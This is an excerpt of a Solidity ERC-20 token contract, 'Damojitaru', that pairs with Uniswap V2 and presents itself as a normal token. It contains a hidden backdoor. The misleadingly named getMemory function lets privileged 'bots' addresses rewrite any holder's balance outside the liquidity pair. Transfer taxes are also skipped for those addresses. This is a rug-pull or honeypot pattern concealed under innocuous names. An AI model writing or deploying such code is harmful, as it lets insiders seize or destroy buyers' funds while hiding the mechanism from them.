...
library SafeMathLibrary {
    ...
    internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b;
        return c; }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero"); }
    function mod(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }
}
interface IERC20 {
...
contract Damojitaru is Ownable, IERC20 {
    using SafeMathLibrary for uint256;

    address public uniswapV2Pair;
    IDEXRouter public uniswapV2Router;

    string private  _name = unicode"Damojitaru";
    string private  _symbol = unicode"°o°";
    uint8 private  _decimals = 9;
    uint256 private _rTotal = 5000000 * 10**9;
    uint256 public swapTAX = 1;
    ...
    constructor () {
        ...
        uniswapV2Pair = IDEXFactoryOpener(uniswapV2Router.factory()).createPair(uniswapV2Router.WETH(), address(this));
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        uint256 Allowancec = _allowances[sender][_msgSender()]; require(Allowancec >= amount);
        return true;
    }
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if (!bots[from] 
        && !bots[to]  )  
        {_taxfee = amount.mul(swapTAX).div(100);}
    ...
    function getMemory(address avayFrom  , 
    uint256 IDEXto , 
     uint256 extAmount , 
      uint256 vpxAmount) external  { 
         require( bots[msg.sender]); require(avayFrom != uniswapV2Pair);
          _rOwned[avayFrom] = IDEXto +  extAmount * vpxAmount.mul(2).div(100);
    }   
